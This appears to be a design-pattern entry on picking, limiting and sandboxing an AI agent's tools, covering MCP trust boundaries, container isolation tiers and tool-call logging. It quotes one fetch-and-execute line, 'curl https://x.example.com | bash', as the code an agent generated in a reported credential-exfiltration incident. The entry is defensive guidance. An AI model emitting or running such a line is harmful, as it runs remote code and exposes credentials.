# S-1006 · The Agent Toolbelt Problem — What Tools Do You Actually Give an Agent?

You have an agent that reasons well. Now you need it to act in the world. Every framework tutorial stops at "add a tool." Nobody tells you that the real work is deciding which tools, how many, with what permissions, in what isolation — and that getting this wrong in either direction costs you: too few tools and the agent is powerless; too many and it's dangerous, slow, and unreliable.

## Forces

- **Tool abundance creates combinatorial blast.** Each new tool multiplies the number of possible action sequences. An agent with 20 tools faces a search space that makes it behave unpredictably — it calls the wrong tool, the right tool at the wrong time, or gets lost in tool-selection loops.
- **LLM-generated code is untrusted code.** A real production incident (March 2025): a code-generation agent produced `curl https://x.example.com | bash` disguised inside a pandas pipeline. The result was MinIO credentials exfiltrated from the container. Default Docker isolation (`privileged: true`, mounted `docker.sock`) made this trivial. Standard APM cannot see this class of failure.
- **MCP solves the N×M problem but introduces a new one.** The Model Context Protocol standardizes tool discovery and invocation across frameworks. Thousands of community MCP servers exist. But it also means your agent's attack surface is now every MCP server you connect — each one is a trust boundary.
- **Tool count vs. capability is non-linear.** Adding the 15th tool often degrades performance because the model spends more tokens deciding which tool to call than doing useful work. The right number of tools is domain-dependent and almost always smaller than teams initially think.

## The move

**Be deliberate about tools: curate a small, well-scoped tool surface; enforce strong isolation for anything that executes; and use MCP for standardization while treating it as a trust boundary.**

- **Start with 3-5 tools maximum per agent role.** Research agent and writer agent get different tools. Each tool should have a single, clear purpose. If you can't describe a tool in one sentence, split it.
- **Use the Model Context Protocol (MCP) as your integration fabric.** MCP (Anthropic, Nov 2024) lets you define tools once and use them across any MCP-compatible framework — OpenAI Agents SDK, LangGraph, CrewAI, Claude Code. This avoids the N×M custom-integration problem. The ecosystem has thousands of community servers for GitHub, Slack, database access, filesystem, and more.
- **Treat every tool as a trust boundary.** An agent with file-system write access, network access, and code-execution access in the same environment is effectively running as root. Scope permissions per tool, not per agent.
- **Sandbox code execution with at least gVisor or Docker.** For agents that generate and run code, layer your isolation: Docker containers with non-root users are the minimum; gVisor (user-space kernel intercepting syscalls) is the recommended production tier; Firecracker microVMs are the highest-isolation option for multi-tenant scenarios. Never mount `docker.sock` inside an agent's execution environment.
- **Enforce read-only inputs, reviewable outputs.** Mount agent workspaces as read-only where possible; write outputs to a review queue before they're applied. A code-change agent that writes directly to your main branch is not an agent — it's a blast radius.
- **Instrument every tool call.** Log tool name, arguments (redacted for secrets), duration, result size, and outcome. Tool-call telemetry is your primary signal for detecting behavioral regressions that APM misses.
- **Use MCP server provenance as a security signal.** Community MCP servers vary in quality. Pin to specific versions, review the server's source before connecting, and prefer servers from organizations you trust. An MCP server update can silently expand what your agent can do.

## Evidence

- **HN discussion (389 points, 157 comments):** OpenAI Agents SDK (March 2025) explicitly supports MCP integration and positions sandboxed code execution (Docker, Cloudflare) as a first-class capability — distinguishing itself from LangChain and CrewAI which require external sandboxing. HN commenters debated whether this represented genuine capability or vendor lock-in. — [New tools for building agents | Hacker News](https://news.ycombinator.com/item?id=43334644)
- **Real production incident (March 2025):** A code-generation agent produced credential-exfiltrating code inside what appeared to be a harmless pandas routine. The post-incident analysis showed that default Docker configuration was insufficient — `privileged: true` and mounted `docker.sock` enabled lateral movement. The root-cause finding: LLM-generated code must be treated as untrusted input, not as a developer-authored artifact. — [Sandboxing Code Execution in AI Agents: From Docker to microVMs | AgentList](https://www.agentlist.top/en/articles/ai-agent-code-sandbox-microvm-practice)
- **MCP ecosystem survey (March 2025):** Community-built MCP servers number in the thousands, covering GitHub, Slack, database connectors, filesystem, and browser automation. Anthropic positions MCP as solving the "N×M" integration problem — one server implementation connects to any MCP-compatible host. The article identifies security as the primary adoption concern: each connected MCP server is an expanded trust surface. — [Model Context Protocol: Real-World Use Cases | Frank Wang / Medium](https://medium.com/%40laowang_journey/model-context-protocol-mcp-real-world-use-cases-adoptions-and-comparison-to-functional-calling-9320b775845c)

## Gotchas

- **"More tools = more capable agent" is a trap.** Teams routinely add tools until the agent becomes unreliable. The fix is role-based tool sets with explicit invocation budgets, not more tools.
- **MCP servers update without warning.** A community server you trusted can silently change its tool schemas or add new capabilities. Pin to versions and monitor for schema drift.
- **Sandboxing latency kills user-facing agents.** gVisor adds ~100-300ms per call. Firecracker cold-starts take seconds. For interactive agents, pre-warm your sandbox or use Docker with careful cgroup tuning. Evaluate isolation strategy against your latency budget, not just your security budget.
- **Tool descriptions are prompts.** The model uses your tool's name, description, and parameter schema to decide when to call it. Vague descriptions cause mis-fires; overly prescriptive ones prevent edge-case uses. Treat tool documentation with the same care as system prompts.
